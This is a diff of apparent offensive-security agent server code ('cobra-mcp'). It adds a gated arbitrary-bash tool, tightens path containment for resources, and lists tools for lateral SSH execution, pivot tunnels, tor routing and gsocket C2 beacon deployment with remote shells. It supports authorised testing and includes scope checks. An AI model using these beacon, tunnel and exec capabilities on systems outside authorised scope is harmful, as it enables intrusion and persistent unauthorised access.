+var MAX_TIMEOUT_S = 900;
+var SUMMARY_LINES = 30;
+var GATE_OFF = "SHELL DISABLED: set COBRA_ENABLE_SHELL=1 on the server";
+var GATE_HINT = " and restart. Arbitrary local exec is a separate blast radius from tunnels \u2014 gate it on only when you mean it.";
+function runSh(command, timeoutMs, cwd) {
+  const bash = "bash";
+  fs5.mkdirSync(CONFIG.lootDir, { recursive: true });
+  const file2 = path7.join(CONFIG.lootDir, `shell_run-${(/* @__PURE__ */ new Date()).toISOString().replace(/[:.]/g, "-")}.log`);
+  const started = Date.now();
+  return new Promise((resolve, reject) => {
+    const child = spawn4(bash, ["-c", `${command}; echo ${SH_MARK}:$?`], {
+      stdio: ["ignore", "pipe", "pipe"],
+      env: process.env,
+      cwd: cwd ?? CONFIG.lootDir
+    });
+    const out = fs5.createWriteStream(file2, { flags: "a" });
+    let captured = "";
+    let rc = null;
+    let settled = false;
+    const finish = (timedOut) => {
+      if (settled)
+        return;
+      settled = true;
+      clearTimeout(timer);
+      try {
+        child.kill("SIGKILL");
+      } catch {
+      }
+      out.end();
+      resolve({
+        rc,
+        output: captured.replace(new RegExp(`${SH_MARK}:\\d+\\s*$`), "").trim(),
+        lootFile: file2,
+        timedOut,
+        durationMs: Date.now() - started
+      });
+    };
+    const onData = (d) => {
+      out.write(d);
+      if (captured.length < 256 * 1024)
+        captured += d.toString();
+      const m = captured.match(/__COBRA_SH_RC__:(\d+)/);
+      if (m) {
+        rc = Number(m[1]);
+        finish(false);
+      }
+    };
+    child.stdout.on("data", onData);
+    child.stderr.on("data", onData);
+    child.on("error", (err) => {
+      clearTimeout(timer);
+      out.end();
+      reject(new Error(`SPAWN ERROR running bash: ${err.message}`));
+    });
+    child.on("close", () => finish(false));
+    const timer = setTimeout(() => finish(true), timeoutMs);
+  });
+}
+function registerShellTools(server) {
+  server.tool("shell_run", "Run an arbitrary bash command on the OPERATOR box (non-interactive `bash -c`, shell rc NOT loaded). For local work: payload assembly, loot post-processing, driving tools with no wrapper. Not for remote targets \u2014 use exec_ssh/c2_gs_shell for those. Gated by COBRA_ENABLE_SHELL=1 (default off, separate blast radius from tunnels). Optional `target=` (IP/host literal in the args) is scope-checked and recorded in the loot header. Output \u2192 loot file; summary + sentinel exit code returned.", {
+    command: external_exports.string().describe("Bash command, e.g. 'cd loot; msfvenom -p ... -o egg'"),
+    target: external_exports.string().optional().describe("IP/host literal appearing in the args \u2014 scope-checked pre-spawn"),
+    timeout: external_exports.number().optional().describe(`Seconds to wait (default ${DEFAULT_TIMEOUT_S}, max ${MAX_TIMEOUT_S})`)
+  }, async ({ command, target, timeout }) => {
+    if (!CONFIG.enableShell) {
+      throw new Error(GATE_OFF + GATE_HINT);
+    }
+    if (target)
+      assertInScope(target);
+    const timeoutS = Math.min(timeout ?? DEFAULT_TIMEOUT_S, MAX_TIMEOUT_S);
+    const r = await runSh(command, timeoutS * 1e3);
+    const status = r.timedOut ? `TIMED OUT after ${timeoutS}s \u2014 partial output below` : r.rc === null ? "channel closed before the completion marker" : `exit ${r.rc}`;
+    const lines = r.output.split("\n");
+    const head = lines.slice(0, SUMMARY_LINES).join("\n");
+    const more = lines.length > SUMMARY_LINES ? `
+\u2026 (${lines.length - SUMMARY_LINES} more lines in loot file)` : "";
+    return text10(`## shell_run \u2014 ${status} in ${(r.durationMs / 1e3).toFixed(1)}s${target ? `  [re: ${target}]` : ""}
+
+` + (r.output ? head + more : "(no output)") + `
+
+\u{1F4C1} Full output: ${r.lootFile}`);
+  });
+  server.tool("shell_xhome_probe", "Report cobrashell xhome-bastion visibility from the SERVER's env (login shell rc does not run in the server): Is XHOME set and live? Is cobrashell.sh readable? Findings include the exact bash plumbing the operator agent should use (PATH prepend + mark-running) before using xhome as its bastion cwd. Ungated and read-only.", {}, async () => {
+    const xh = process.env.XHOME;
+    let live = false;
+    let details = "";
+    if (xh) {
+      try {
+        const st = fs5.statSync(xh);
+        live = st.isDirectory();
+        details = live ? "directory exists" : "set but not a directory";
+      } catch {
+        details = "set but not present on disk";
+      }
+    }
+    const shCandidates = ["/etc/cobra/cobrashell.sh", "/usr/share/cobra/cobrashell.sh"].filter((p) => {
+      try {
+        fs5.accessSync(p, fs5.constants.R_OK);
+        return true;
+      } catch {
+        return false;
+      }
+    });
+    const lines = [];
+    lines.push(`XHOME env: ${xh ?? "(unset)"}`);
+    lines.push(`XHOME live: ${live ? `yes (${details})` : `no (${details || "unset"})`}`);
+    lines.push(`cobrashell.sh readable: ${shCandidates.length ? shCandidates.join(", ") : "(none found)"}`);
+    lines.push("");
+    if (live && xh) {
+      lines.push(`Plumbing for bastion cwd (run via shell_run):
+  export PATH="${xh}:${xh}/bin:$PATH"
+  touch "${xh}/.run/$$"  # mark-running: xkeep-style, optional
+  cd "${xh}" && <your command>`);
+    } else {
+      lines.push("Bastion unavailable in this env \u2014 the /usr/local/bin/cobra launcher strips XHOME (launch via an interactive cobrashell to inherit it), or just use plain bash cwd=loot.");
+    }
+    return text10(lines.join("\n"));
+  });
+}
+
+// build/tools/profiles.js
+function text11(s) {
+  return { content: [{ type: "text", text: s }] };
+}
+function statusLine(installed, missing) {
+  if (missing.length === 0)
+    return "\u2705 full";
+  if (installed.length > 0)
+    return "\u{1F7E1} partial";
+  return "\u274C absent";
+}
+function registerProfileTools(server) {
+  server.tool("profile_list", "List the COBRA_PROFILES OS tool groups (wireless / ad / exploit / webplus) with availability: which binaries are installed vs missing on this box, and the rebuild hint for any absent group. Read-only \u2014 the agent never auto-installs a profile.", {}, async () => {
+    const ps = probeProfiles();
+    const lines = ["## COBRA_PROFILES tool groups", ""];
+    for (const p of ps) {
+      lines.push(`- **${p.name}** \u2014 ${p.desc}`);
+      lines.push(`    status: ${statusLine(p.installed, p.missing)}`);
+      lines.push(`    installed: ${p.installed.join(", ") || "\u2014"}`);
+      lines.push(`    missing:   ${p.missing.join(", ") || "\u2014"}`);
+      if (p.missing.length > 0) {
+        lines.push(`    add with:  COBRA_PROFILES="${p.name}" (rebuild) \u2192 apt: ${p.packages}`);
+      }
+      if (p.note)
+        lines.push(`    note: ${p.note}`);
+      lines.push("");
+    }
+    lines.push("_Profiles are OS build-time groups. The agent reports and recommends; the operator rebuilds. Nothing here is auto-installed._");
+    return text11(lines.join("\n"));
+  });
+  server.tool("profile_check", "Check one COBRA_PROFILES group by name (wireless | ad | exploit | webplus): installed/missing binaries, the exact rebuild command, and scope/OPSEC notes for using it. Read-only.", {
+    name: external_exports.enum(["wireless", "ad", "exploit", "webplus"]).describe("Profile name")
+  }, async ({ name }) => {
+    const p = profileStatus(name);
+    if (!p) {
+      return text11(`Unknown profile: ${name}. Known: ${Object.keys(PROFILE_MAP).join(", ")}`);
+    }
+    const lines = [];
+    lines.push(`## profile: ${p.name} \u2014 ${p.desc}`);
+    lines.push(`status: ${statusLine(p.installed, p.missing)}`);
+    lines.push(`installed: ${p.installed.join(", ") || "\u2014"}`);
+    lines.push(`missing:   ${p.missing.join(", ") || "\u2014"}`);
+    if (p.missing.length > 0) {
+      lines.push("");
+      lines.push(`To enable: rebuild the OS with this profile, e.g.`);
+      lines.push(`  COBRA_PROFILES="${p.name}" ./build-iso.sh   (or add to an existing build)`);
+      lines.push(`  packages: ${p.packages}`);
+    } else {
+      lines.push("");
+      lines.push("All binaries present \u2014 this profile is usable now.");
+    }
+    if (p.note) {
+      lines.push("");
+      lines.push(`\u26A0\uFE0F ${p.note}`);
+    }
+    return text11(lines.join("\n"));
+  });
+}
+
+// build/tools/brain.js
+import fs6 from "node:fs";
+import path8 from "node:path";
+function text12(s) {
   return { content: [{ type: "text", text: s }] };
 }
 function registerBrainTools(server) {
@@ -31903,46 +32922,57 @@ function registerBrainTools(server) {
     content: external_exports.string().describe("Full new brain markdown \u2014 the complete document, not a diff")
   }, async ({ content }) => {
     if (!content.trim()) {
-      return text8("\u26A0\uFE0F brain_write refused: empty content would wipe the brain. Send the full document.");
+      return text12("\u26A0\uFE0F brain_write refused: empty content would wipe the brain. Send the full document.");
     }
-    fs3.mkdirSync(path5.dirname(CONFIG.brainPath), { recursive: true });
-    fs3.writeFileSync(CONFIG.brainPath, content, "utf8");
-    return text8(`\u{1F9E0} Brain written (${content.length} bytes) \u2192 ${CONFIG.brainPath}`);
+    fs6.mkdirSync(path8.dirname(CONFIG.brainPath), { recursive: true });
+    fs6.writeFileSync(CONFIG.brainPath, content, "utf8");
+    return text12(`\u{1F9E0} Brain written (${content.length} bytes) \u2192 ${CONFIG.brainPath}`);
   });
   server.tool("brain_append", "Append a terse dated note to the end of the brain (Lessons Learned lives last). For structured section updates use brain_write instead.", {
     note: external_exports.string().describe("One-line markdown note to append")
   }, async ({ note }) => {
     if (!note.trim())
-      return text8("\u26A0\uFE0F brain_append refused: empty note");
-    fs3.mkdirSync(path5.dirname(CONFIG.brainPath), { recursive: true });
+      return text12("\u26A0\uFE0F brain_append refused: empty note");
+    fs6.mkdirSync(path8.dirname(CONFIG.brainPath), { recursive: true });
     const stamp = (/* @__PURE__ */ new Date()).toISOString().slice(0, 10);
-    fs3.appendFileSync(CONFIG.brainPath, `
+    fs6.appendFileSync(CONFIG.brainPath, `
 - ${note.trim()} (${stamp})
 `, "utf8");
-    return text8(`\u{1F9E0} Note appended \u2192 ${CONFIG.brainPath}`);
+    return text12(`\u{1F9E0} Note appended \u2192 ${CONFIG.brainPath}`);
   });
 }
 
 // build/resources/index.js
-import fs4 from "node:fs";
-import path6 from "node:path";
-function textResource(uri, text9) {
-  return { contents: [{ uri, text: text9 }] };
+import fs7 from "node:fs";
+import path9 from "node:path";
+function textResource(uri, text13) {
+  return { contents: [{ uri, text: text13 }] };
 }
 function readFileSafe(p) {
   try {
-    return fs4.readFileSync(p, "utf8");
+    return fs7.readFileSync(p, "utf8");
   } catch {
     return `(not found: ${p})`;
   }
+}
+function resolveContained(base, p) {
+  const resolved = path9.resolve(base, p);
+  const baseResolved = path9.resolve(base);
+  if (resolved === baseResolved)
+    return resolved;
+  if (resolved.startsWith(baseResolved + path9.sep))
+    return resolved;
+  return null;
 }
 var OPSHELP = `# cobra-mcp opshelp
 
 Scope: ${"${SCOPE}"}
 
 ## Tools
-- target_set <host>            set active target (must be in scope)
-- target_get                   show active target
+- target_set <host>            register + activate a target (must be in scope)
+- target_get                   show active target (most recently set)
+- target_list                  all registered targets, active marked
+- target_clear [host]          remove one target (or all)
 - loot_path                    show loot directory
 - recon_fast_scan [t]          nmap -T4 -F (top ports)
 - recon_full_scan [t]          nmap -p- (all TCP)
@@ -31950,7 +32980,7 @@ Scope: ${"${SCOPE}"}
 - recon_vuln_scan [t]          \u26A0\uFE0F slow/noisy vulners
 - recon_udp_scan [t]           UDP top-100 (sudo)
 - recon_dns <name>             dig any
-- recon_whois <target>         whois
+- recon_whois <target>         whois \u2014 egress-gated (COBRA_ALLOW_INTERNET=1 or tor=1)
 - recon_smb_enum [t]           smb NSE enum
 - web_dir_brute <url> [wl]     ffuf/gobuster
 - web_vuln_scan <url>          \u26A0\uFE0F nikto
@@ -31966,6 +32996,22 @@ Scope: ${"${SCOPE}"}
 - listen_start <port>          nc listener (session)
 - capture_sniff_start <iface>  tcpdump (session)
 - capture_pcap_start <i> <o>   tshark (session)
+- exec_ssh <h> <u> <cmd>       run a command on a host (password/key) \u2014 lateral exec
+- ssh_key_setup <h> <u> <pw>   engagement keypair (loot dir) + pubkey install
+- tunnel_socks_start <h> <u>   SOCKS5 through a foothold (ssh -D, COBRA_ENABLE_TUNNELS=1)
+- tunnel_list / tunnel_stop    manage tunnels
+- via=<tunnel-id>              route recon/web/creds tools through a tunnel (proxychains)
+- tor=1                        route recon/web/creds + c2_gs_* through tor (COBRA_ENABLE_PROXY=1)
+                                 .onion targets REQUIRE tor=1; add .onion to COBRA_ALLOWED_SCOPE
+- c2_gs_secret                 generate a gsocket secret (local RNG, no gate)
+- c2_gs_deploy [mode] [host..] gs beacon one-liner (+ optional ssh auto-deploy to /dev/shm)
+- c2_gs_shell <beacon> <cmd>   run a command through the relay to a shell beacon
+- c2_gs_socks_start <beacon>   SOCKS5 pivot through a socks beacon (via= ready)
+- c2_gs_list                   beacons + tunnels dashboard (with cleanup commands)
+- shell_run <cmd> [target]     local bash -c on the OPERATOR box (COBRA_ENABLE_SHELL=1)
+- shell_xhome_probe            xhome-bastion env report (ungated, read-only)
+- profile_list                 COBRA_PROFILES tool groups: installed vs missing (read-only)
+- profile_check <name>         one group's binaries + rebuild hint (wireless|ad|exploit|webplus)
 - session_list                 active sessions
 - session_output <id>          tail session output
 - session_kill <id>            stop session
@@ -31983,7 +33029,7 @@ Update the brain after every phase (brain_write / brain_append).
 `;
 function registerResources(server) {
   server.resource("opshelp", "cobra://opshelp", async (uri) => textResource(uri.href, OPSHELP.replace("${SCOPE}", scopeSummary())));
-  server.resource("capabilities", "cobra://capabilities", async (uri) => textResource(uri.href, capabilitiesMarkdown()));
+  server.resource("capabilities", "cobra://capabilities", async (uri) => textResource(uri.href, capabilitiesMarkdown() + "\n" + profilesMarkdown()));
   server.resource("target", "cobra://target", async (uri) => textResource(uri.href, getTarget() ? `Active target: ${getTarget()}` : "No target set."));
   server.resource("sessions", "cobra://sessions", async (uri) => {
     const ss = listSessions();
@@ -31991,18 +33037,18 @@ function registerResources(server) {
     return textResource(uri.href, body);
   });
   server.resource("brain", "cobra://brain", async (uri) => textResource(uri.href, readFileSafe(CONFIG.brainPath)));
-  server.resource("buildplan", "cobra://buildplan", async (uri) => textResource(uri.href, readFileSafe(path6.join(CONFIG.repoRoot, "BUILD_PLAN.md"))));
-  const missionsDir = path6.join(path6.dirname(CONFIG.brainPath), "missions");
+  server.resource("buildplan", "cobra://buildplan", async (uri) => textResource(uri.href, readFileSafe(path9.join(CONFIG.repoRoot, "BUILD_PLAN.md"))));
+  const missionsDir = path9.join(path9.dirname(CONFIG.brainPath), "missions");
   server.resource("missions", "cobra://missions", async (uri) => {
     let files = [];
     try {
-      files = fs4.readdirSync(missionsDir).filter((f) => f.endsWith(".mission.md")).sort();
+      files = fs7.readdirSync(missionsDir).filter((f) => f.endsWith(".mission.md")).sort();
     } catch {
     }
     const body = [
       `Mission directory: ${missionsDir}`,
-      `Template: ${path6.join(missionsDir, "TEMPLATE.mission.md")}`,
-      `Run one: cobra mission ${path6.join(missionsDir, "<name>.mission.md")}`,
+      `Template: ${path9.join(missionsDir, "TEMPLATE.mission.md")}`,
+      `Run one: cobra mission ${path9.join(missionsDir, "<name>.mission.md")}`,
       "",
       files.length ? files.map((f) => `- ${f}`).join("\n") : "- (no missions yet \u2014 copy the template)"
     ].join("\n");
@@ -32011,7 +33057,7 @@ function registerResources(server) {
   server.resource("mission", new ResourceTemplate("cobra://missions/{file}", {
     list: async () => {
       try {
-        const files = fs4.readdirSync(missionsDir).filter((f) => f.endsWith(".md"));
+        const files = fs7.readdirSync(missionsDir).filter((f) => f.endsWith(".md"));
         return {
           resources: files.map((f) => ({
             uri: `cobra://missions/${f}`,
@@ -32024,15 +33070,15 @@ function registerResources(server) {
       }
     }
   }), async (uri, vars) => {
-    const p = path6.join(missionsDir, String(vars.file));
-    if (!p.startsWith(missionsDir))
+    const p = resolveContained(missionsDir, String(vars.file));
+    if (!p)
       return textResource(uri.href, "(access denied)");
     return textResource(uri.href, readFileSafe(p));
   });
   server.resource("loot", new ResourceTemplate("cobra://loot/{path}", {
     list: async () => {
       try {
-        const files = fs4.readdirSync(CONFIG.lootDir);
+        const files = fs7.readdirSync(CONFIG.lootDir);
         return {
           resources: files.map((f) => ({
             uri: `cobra://loot/${f}`,
@@ -32045,15 +33091,15 @@ function registerResources(server) {
       }
     }
   }), async (uri, vars) => {
-    const p = path6.join(CONFIG.lootDir, String(vars.path));
-    if (!p.startsWith(CONFIG.lootDir))
+    const p = resolveContained(CONFIG.lootDir, String(vars.path));
+    if (!p)
       return textResource(uri.href, "(access denied)");
     return textResource(uri.href, readFileSafe(p));
   });
   server.resource("tradecraft", new ResourceTemplate("cobra://tradecraft/{guide}", {
     list: async () => {
       try {
-        const files = fs4.readdirSync(CONFIG.tradecraftDir).filter((f) => f.endsWith(".md"));
+        const files = fs7.readdirSync(CONFIG.tradecraftDir).filter((f) => f.endsWith(".md"));
         return {
           resources: files.map((f) => ({
             uri: `cobra://tradecraft/${f}`,
@@ -32066,8 +33112,8 @@ function registerResources(server) {
       }
     }
   }), async (uri, vars) => {
-    const p = path6.join(CONFIG.tradecraftDir, String(vars.guide));
-    if (!p.startsWith(CONFIG.tradecraftDir))
+    const p = resolveContained(CONFIG.tradecraftDir, String(vars.guide));
+    if (!p)
       return textResource(uri.href, "(access denied)");
     return textResource(uri.href, readFileSafe(p));
   });
@@ -32144,6 +33190,10 @@ async function main() {
   registerExploitTools(server);
   registerPayloadTools(server);
   registerCaptureTools(server);
+  registerLateralTools(server);
+  registerC2Tools(server);
+  registerShellTools(server);
+  registerProfileTools(server);
   registerBrainTools(server);
   registerResources(server);
   registerPrompts(server);
